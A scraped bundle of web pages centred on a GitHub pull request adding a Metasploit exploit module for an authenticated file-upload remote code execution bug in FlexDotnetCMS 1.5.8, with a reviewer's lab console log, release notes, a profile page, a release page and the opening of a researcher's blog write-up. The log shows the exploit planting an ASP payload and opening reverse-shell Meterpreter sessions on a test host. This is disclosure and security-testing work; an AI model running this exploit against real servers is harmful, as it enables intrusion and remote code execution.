[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)
Outdated

Show resolved

Hide resolved

[modules/exploits/windows/http/flexdotnetcms\_upload\_exec.rb](/rapid7/metasploit-framework/pull/14339/files/31237258e5d6e6c79b6fc4dc8a1cfadc0f5956d9#diff-a437e70cce033b379ddff429e4b1d0adb562d9b3869036fcafdb3771437056d4)

Show resolved

Hide resolved

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=40&v=4)](/ErikWynter)

`[replace Checkcode:Unknown with Detected in check(), skip cleanup unle…](/rapid7/metasploit-framework/pull/14339/commits/9417266d2125def4810a48cd5dbf065d83caeecc "replace Checkcode:Unknown with Detected in check(), skip cleanup unless required")`
 …

`[9417266](/rapid7/metasploit-framework/pull/14339/commits/9417266d2125def4810a48cd5dbf065d83caeecc)`

```
…ss required
```

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=80&u=e6852387fd561b7594bfdb869d952906e0c1e472&v=4)](/ErikWynter)

Copy link

Contributor

Author

### **[ErikWynter](/ErikWynter)** commented [Nov 23, 2020](#issuecomment-732164121)

| Thanks [@space-r7](https://github.com/space-r7)! I implemented all the changes. Let me know if I can do anything else to help get this landed. |
| --- |

 👍
1
 space-r7 reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[space-r7](/space-r7)
added a commit
that referenced
this pull request
[Dec 7, 2020](#ref-commit-8e1cab0)
[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

`[Land](/rapid7/metasploit-framework/commit/8e1cab0131694136a2d5c71e453ec1fe81af6988 "Land #14339, add flexdotnetcms rce") [#14339](https://github.com/rapid7/metasploit-framework/pull/14339)[, add flexdotnetcms rce](/rapid7/metasploit-framework/commit/8e1cab0131694136a2d5c71e453ec1fe81af6988 "Land #14339, add flexdotnetcms rce")`

`[8e1cab0](/rapid7/metasploit-framework/commit/8e1cab0131694136a2d5c71e453ec1fe81af6988)`

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
merged commit [`9417266`](/rapid7/metasploit-framework/commit/9417266d2125def4810a48cd5dbf065d83caeecc)
into
rapid7:master

[Dec 7, 2020](https://github.com/rapid7/metasploit-framework/pull/14339#event-4081540028)

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Dec 7, 2020](#issuecomment-740162895)

| Changes look good to me. Had some assistance with testing and made sure the cleanup isn't always called:  ``` msf6 exploit(windows/http/flexdotnetcms_upload_exec) > set RPORT 8080 RPORT => 8080 msf6 exploit(windows/http/flexdotnetcms_upload_exec) > set VHOST localhost VHOST => localhost msf6 exploit(windows/http/flexdotnetcms_upload_exec) > exploit [*] Started reverse TCP handler on 192.168.159.128:4444  [*] Executing automatic check (disable AutoCheck to override) [+] Successfully authenticated to FlexDotnetCMS [*] FlexDotnetCMS is installed on the target at C:/Users/smcintyre/Downloads/FlexDotnetCMS-1.5.8/FlexDotnetCMS-1.5.8/ [*] Uploaded test file uRfpyi.txt. Attempting to rename the file to uRfpyi.asp... [+] Successfully renamed test file uRfpyi.txt to uRfpyi.asp (this is a copy of uRfpyi.txt, which remains on the server) [+] The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower. [*] Renaming uRfpyi.txt to uRfpyi.asp again, this time adding the payload [+] Successfully added the ASP payload to uRfpyi.asp [*] Executing the payload... [*] Sending stage (175174 bytes) to 192.168.159.32 [*] Meterpreter session 1 opened (192.168.159.128:4444 -> 192.168.159.32:49372) at 2020-12-07 15:18:59 -0500 [+] Successfully deleted uRfpyi.txt [+] Successfully deleted uRfpyi.asp meterpreter > getuid Server username: WIN-I4J71512HD3\smcintyre meterpreter > sysinfo Computer        : WIN-I4J71512HD3 OS              : Windows 2012 R2 (6.3 Build 9600). Architecture    : x64 System Language : en_US Domain          : WORKGROUP Logged On Users : 2 Meterpreter     : x86/windows meterpreter > background  [*] Backgrounding session 1... msf6 exploit(windows/http/flexdotnetcms_upload_exec) > show options  Module options (exploit/windows/http/flexdotnetcms_upload_exec):    Name       Current Setting  Required  Description    ----       ---------------  --------  -----------    PASSWORD   Password1        yes       Password to authenticate with    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS     192.168.159.32   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      8080             yes       The target port (TCP)    SSL        false            no        Negotiate SSL/TLS for outgoing connections    TARGETURI  /                yes       The base path to FlexDotnetCMS    USERNAME   admin            yes       Username to authenticate with    VHOST      localhost        no        HTTP server virtual host Payload options (windows/meterpreter/reverse_tcp):    Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST     192.168.159.128  yes       The listen address (an interface may be specified)    LPORT     4444             yes       The listen port Exploit target:    Id  Name    --  ----    0   Windows (x86) msf6 exploit(windows/http/flexdotnetcms_upload_exec) > vheck [-] Unknown command: vheck. msf6 exploit(windows/http/flexdotnetcms_upload_exec) > check [+] Successfully authenticated to FlexDotnetCMS [*] FlexDotnetCMS is installed on the target at C:/Users/smcintyre/Downloads/FlexDotnetCMS-1.5.8/FlexDotnetCMS-1.5.8/ [*] Uploaded test file LbRhWhjtTQ.txt. Attempting to rename the file to LbRhWhjtTQ.asp... [+] Successfully renamed test file LbRhWhjtTQ.txt to LbRhWhjtTQ.asp (this is a copy of LbRhWhjtTQ.txt, which remains on the server) [+] 192.168.159.32:8080 - The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower. [+] Successfully deleted LbRhWhjtTQ.txt [+] Successfully deleted LbRhWhjtTQ.asp msf6 exploit(windows/http/flexdotnetcms_upload_exec) > show targets  Exploit targets:    Id  Name    --  ----    0   Windows (x86)    1   Windows (x64) msf6 exploit(windows/http/flexdotnetcms_upload_exec) > set TARGET 1 TARGET => 1 msf6 exploit(windows/http/flexdotnetcms_upload_exec) > exploit [*] Started reverse TCP handler on 192.168.159.128:4444  [*] Executing automatic check (disable AutoCheck to override) [+] Successfully authenticated to FlexDotnetCMS [*] FlexDotnetCMS is installed on the target at C:/Users/smcintyre/Downloads/FlexDotnetCMS-1.5.8/FlexDotnetCMS-1.5.8/ [*] Uploaded test file dPFahrw.txt. Attempting to rename the file to dPFahrw.asp... [+] Successfully renamed test file dPFahrw.txt to dPFahrw.asp (this is a copy of dPFahrw.txt, which remains on the server) [+] The target is vulnerable. Target is FlexDotnetCMS v1.5.8 or lower. [*] Renaming dPFahrw.txt to dPFahrw.asp again, this time adding the payload [+] Successfully added the ASP payload to dPFahrw.asp [*] Executing the payload... [*] Sending stage (200262 bytes) to 192.168.159.32 [*] Meterpreter session 2 opened (192.168.159.128:4444 -> 192.168.159.32:49393) at 2020-12-07 15:19:20 -0500 [+] Successfully deleted dPFahrw.txt [+] Successfully deleted dPFahrw.asp meterpreter > getuid Server username: WIN-I4J71512HD3\smcintyre meterpreter > sysinfo Computer        : WIN-I4J71512HD3 OS              : Windows 2012 R2 (6.3 Build 9600). Architecture    : x64 System Language : en_US Domain          : WORKGROUP Logged On Users : 2 Meterpreter     : x64/windows meterpreter >  ``` |
| --- |

 🎉
1
 ErikWynter reacted with hooray emoji
 🚀
1
 ErikWynter reacted with rocket emoji

All reactions

* 🎉
  1 reaction
* 🚀
  1 reaction

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=80&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)

Copy link

Contributor

### **[space-r7](/space-r7)** commented [Dec 7, 2020](#issuecomment-740165407) • edited by pbarry-r7 Loading

| Release Notes New module `exploits/windows/http/flexdotnetcms_upload_exec` adds an exploit for FlexDotNetCMS versions `1.5.8` and prior. This module exploits an authenticated file upload vulnerability where a valid user can upload a malicious file with an incorrect extension, rename it with the proper extension, and get code execution as the user running the server on the target. |
| --- |

All reactions

Sorry, something went wrong.

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&u=a478af0f7ed559a0bfc369dfd5ddd7e5aa5c63db&v=4)](/space-r7)
[space-r7](/space-r7)
added
the
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules
label
[Dec 7, 2020](#event-4081787430)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F14339)

Reviewers

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&v=4)](/space-r7) [space-r7](/space-r7)

space-r7 left review comments

Assignees

[![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=40&v=4)](/space-r7) [space-r7](/space-r7)

Labels

[docs](/rapid7/metasploit-framework/labels/docs)
[module](/rapid7/metasploit-framework/labels/module)
[rn-modules](/rapid7/metasploit-framework/labels/rn-modules)
release notes for new or majorly enhanced modules

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@ErikWynter](https://avatars.githubusercontent.com/u/55885619?s=52&v=4)](/ErikWynter) [![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=52&v=4)](/gwillcox-r7) [![@space-r7](https://avatars.githubusercontent.com/u/40177151?s=52&v=4)](/space-r7)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_62a044f8_20250119_131359.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgwillcox-r7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgwillcox-r7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=64&v=4)

**gwillcox-r7**
[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fgwillcox-r7)

[Overview](/gwillcox-r7)
[Repositories
22](/gwillcox-r7?tab=repositories)
[Projects
0](/gwillcox-r7?tab=projects)
[Packages
0](/gwillcox-r7?tab=packages)
[Stars
40](/gwillcox-r7?tab=stars)
[Sponsoring
0](/gwillcox-r7?tab=sponsoring)

More

* [Overview](/gwillcox-r7)
* [Repositories](/gwillcox-r7?tab=repositories)
* [Projects](/gwillcox-r7?tab=projects)
* [Packages](/gwillcox-r7?tab=packages)
* [Stars](/gwillcox-r7?tab=stars)
* [Sponsoring](/gwillcox-r7?tab=sponsoring)

![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=64&v=4)

**gwillcox-r7**

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fgwillcox-r7)

[![View gwillcox-r7's full-sized avatar](https://avatars.githubusercontent.com/u/63261883?v=4)](https://avatars.githubusercontent.com/u/63261883?v=4)

# Grant Willcox gwillcox-r7

[Follow](/login?return_to=https%3A%2F%2Fgithub.com%2Fgwillcox-r7)

This is my work account. For my personal account, see [@tekwizz123](https://github.com/tekwizz123). https://howivscode.com/gwillcox-r7 for my Metasploit work setup using VSCode.
[56
followers](https://github.com/gwillcox-r7?tab=followers) · [2
following](https://github.com/gwillcox-r7?tab=following)

* [@rapid7](https://github.com/rapid7)
* Austin
* 07:13
  (UTC -06:00)
* Mastodon

  [@tekwizz123@ruby.social](https://ruby.social/%40tekwizz123)
* [https://hashnode.com/@tekwizz123](https://hashnode.com/%40tekwizz123)

## [Achievements](/gwillcox-r7?tab=achievements)

[![Achievement: Public Sponsor](https://github.githubassets.com/assets/public-sponsor-default-9fa68986b057.png)](/gwillcox-r7?achievement=public-sponsor&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)x2](/gwillcox-r7?achievement=pair-extraordinaire&tab=achievements)[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/gwillcox-r7?achievement=quickdraw&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/gwillcox-r7?achievement=pull-shark&tab=achievements)
## [Achievements](/gwillcox-r7?tab=achievements)

[![Achievement: Public Sponsor](https://github.githubassets.com/assets/public-sponsor-default-9fa68986b057.png)](/gwillcox-r7?achievement=public-sponsor&tab=achievements)[![Achievement: Pair Extraordinaire](https://github.githubassets.com/assets/pair-extraordinaire-default-579438a20e01.png)x2](/gwillcox-r7?achievement=pair-extraordinaire&tab=achievements)[![Achievement: Quickdraw](https://github.githubassets.com/assets/quickdraw-default-39c6aec8ff89.png)](/gwillcox-r7?achievement=quickdraw&tab=achievements)[![Achievement: Pull Shark](https://github.githubassets.com/assets/pull-shark-default-498c279a747d.png)x2](/gwillcox-r7?achievement=pull-shark&tab=achievements)

Block or Report

# Block or report gwillcox-r7

**Block user**

Prevent this user from interacting with your repositories and sending you notifications.
Learn more about [blocking users](https://docs.github.com/articles/blocking-a-user-from-your-personal-account).

You must be logged in to block users.

Add an optional note:

Please don't include any personal information such as legal names or email addresses. Maximum 100 characters, markdown supported. This note will be visible to only you.

Block user

**Report abuse**

Contact GitHub support about this user’s behavior.
Learn more about [reporting abuse](https://docs.github.com/articles/reporting-abuse-or-spam).

[Report abuse](/contact/report-abuse?report=gwillcox-r7+%28user%29)

[Overview](/gwillcox-r7)
[Repositories
22](/gwillcox-r7?tab=repositories)
[Projects
0](/gwillcox-r7?tab=projects)
[Packages
0](/gwillcox-r7?tab=packages)
[Stars
40](/gwillcox-r7?tab=stars)
[Sponsoring
0](/gwillcox-r7?tab=sponsoring)

More

* [Overview](/gwillcox-r7)
* [Repositories](/gwillcox-r7?tab=repositories)
* [Projects](/gwillcox-r7?tab=projects)
* [Packages](/gwillcox-r7?tab=packages)
* [Stars](/gwillcox-r7?tab=stars)
* [Sponsoring](/gwillcox-r7?tab=sponsoring)

## Pinned Loading

1. [rapid7/metasploit-framework](/rapid7/metasploit-framework) rapid7/metasploit-framework Public

   Metasploit Framework

   Ruby

   [34.6k](/rapid7/metasploit-framework/stargazers)
   [14.1k](/rapid7/metasploit-framework/forks)

Something went wrong, please refresh the page to try again.

If the problem persists, check the [GitHub status page](https://www.githubstatus.com/)
or [contact support](/contact).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fc081729_20250119_112014.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMacdonaldRobinson%2FFlexDotnetCMS%2Freleases%2Ftag%2Fv1.5.9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FMacdonaldRobinson%2FFlexDotnetCMS%2Freleases%2Ftag%2Fv1.5.9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=MacdonaldRobinson%2FFlexDotnetCMS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[MacdonaldRobinson](/MacdonaldRobinson)
/
**[FlexDotnetCMS](/MacdonaldRobinson/FlexDotnetCMS)**
Public template

* [Notifications](/login?return_to=%2FMacdonaldRobinson%2FFlexDotnetCMS) You must be signed in to change notification settings
* [Fork
  7](/login?return_to=%2FMacdonaldRobinson%2FFlexDotnetCMS)
* [Star
   47](/login?return_to=%2FMacdonaldRobinson%2FFlexDotnetCMS)

* [Code](/MacdonaldRobinson/FlexDotnetCMS/tree/v1.5.9)
* [Issues
  0](/MacdonaldRobinson/FlexDotnetCMS/issues)
* [Pull requests
  33](/MacdonaldRobinson/FlexDotnetCMS/pulls)
* [Actions](/MacdonaldRobinson/FlexDotnetCMS/actions)
* [Projects
  0](/MacdonaldRobinson/FlexDotnetCMS/projects)
* [Wiki](/MacdonaldRobinson/FlexDotnetCMS/wiki)
* [Security](/MacdonaldRobinson/FlexDotnetCMS/security)
* [Insights](/MacdonaldRobinson/FlexDotnetCMS/pulse)

Additional navigation options

* [Code](/MacdonaldRobinson/FlexDotnetCMS/tree/v1.5.9)
* [Issues](/MacdonaldRobinson/FlexDotnetCMS/issues)
* [Pull requests](/MacdonaldRobinson/FlexDotnetCMS/pulls)
* [Actions](/MacdonaldRobinson/FlexDotnetCMS/actions)
* [Projects](/MacdonaldRobinson/FlexDotnetCMS/projects)
* [Wiki](/MacdonaldRobinson/FlexDotnetCMS/wiki)
* [Security](/MacdonaldRobinson/FlexDotnetCMS/security)
* [Insights](/MacdonaldRobinson/FlexDotnetCMS/pulse)

1. [Releases](/MacdonaldRobinson/FlexDotnetCMS/releases)
2. [v1.5.9](/MacdonaldRobinson/FlexDotnetCMS/releases/tag/v1.5.9)

# FlexDotNetCMS v1.5.9

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/MacdonaldRobinson/FlexDotnetCMS/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v1.5.9)

 Loading

[View all tags](/MacdonaldRobinson/FlexDotnetCMS/tags)

![@MacdonaldRobinson](https://avatars.githubusercontent.com/u/18366446?s=40&v=4)
[MacdonaldRobinson](/MacdonaldRobinson)
released this
04 Oct 02:37

·
[8 commits](/MacdonaldRobinson/FlexDotnetCMS/compare/v1.5.9...master)
to master
since this release

[v1.5.9](/MacdonaldRobinson/FlexDotnetCMS/tree/v1.5.9)

[`2873992`](/MacdonaldRobinson/FlexDotnetCMS/commit/2873992aa4266502998edb757cc31f3f4867e423)

Improved logic for File Editor Validation

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.vonahi.io_682d2304_20250119_112013.html ===

[![Vonahi Security's Blog](https://blog.vonahi.io/content/images/2019/02/VonahiSec_VERT_RGB.png)](https://blog.vonahi.io)

* [Vonahi Security Home](https://www.vonahi.io/)
* [Blog](https://blog.vonahi.io/)
* [Weekly Threat Reports](https://blog.vonahi.io/weekly-threat-reports/)

11 November 2020
/ [research](/tag/research/)
# What’s in a (re)name: RCE Hunting in CMSs via Unrestricted File Upload

![What’s in a (re)name: RCE Hunting in CMSs via Unrestricted File Upload](/content/images/size/w2000/2020/11/blog-image-nov9.jpg)

> *What's in a name? That which we call a rose*
> *By any other name would smell as sweet*

*-* William Shakespeare

## Introduction

During a recent bug hunting binge I discovered my first two vulnerabilities that could be exploited to achieve remote code execution (RCE). No bragging rights were earned though, because finding and exploiting these issues was incredibly straightforward. I’m not humble bragging here (I wish). In fact, the issue underlying both vulnerabilities, which each affect a different content management system (CMS), is very basic and was literally the second thing I checked for. This article combines my write-ups for the two RCE vulnerabilities as well as a third issue I found in one of the apps:

* Unrestricted file upload in FlexDotnetCMS v1.5.8 and prior ([CVE-2020-27386](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27386&ref=blog.vonahi.io))
* Unrestricted file upload in HorizontCMS 1.0.0-beta and prior ([CVE-2020-27387](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27387&ref=blog.vonahi.io))
* Incorrect access control in FlexDotnetCMS v1.5.10 and prior ([CVE-2020-27385](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27385&ref=blog.vonahi.io))

P.S. While working on this here blog thingy, my old fiction instincts kicked in and I ended up penning a little story meant to serve as a metaphor for the two RCE flaws. This creation makes up the final section, so in case infosec-oriented allegories aren’t your thing, feel free to skip it, ~~you uncultured swine~~.

P.P.S. All of these issues also affected Internet-facing demo apps. =O

## Unrestricted File Upload: You were always on my mind...

[FlexDotnetCMS](https://github.com/MacdonaldRobinson/FlexDotnetCMS?ref=blog.vonahi.io) and [HorizontCMS](https://github.com/ttimot24/HorizontCMS?ref=blog.vonahi.io) are both open source projects with several dozen stars on GitHub, which is how I found out about them. When I started testing these apps, I had just contributed a [Metasploit exploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/maracms_upload_exec.rb?ref=blog.vonahi.io) that took advantage of a very basic arbitrary file upload vulnerability in a PHP web app. Because this attack was still fresh in my mind, it was the first thing I checked for in both applications, as you will see below.

## Unrestricted file upload in FlexDotnetCMS (CVE-2020-27386)

The first app I tested was FlexDotnetCMS. The functionality of the app is reserved for authenticated users, so I started by logging in as the admin user. Once the user dashboard loaded, the *FileManager* immediately caught my eye, so I opened it.

![](https://blog.vonahi.io/content/images/2020/11/main_screen.png)

As you would expect, the *FileManager* allows users to upload, edit, view and delete files. So it seemed like a great place to start my investigation.

![](https://blog.vonahi.io/content/images/2020/11/file_manager.png)

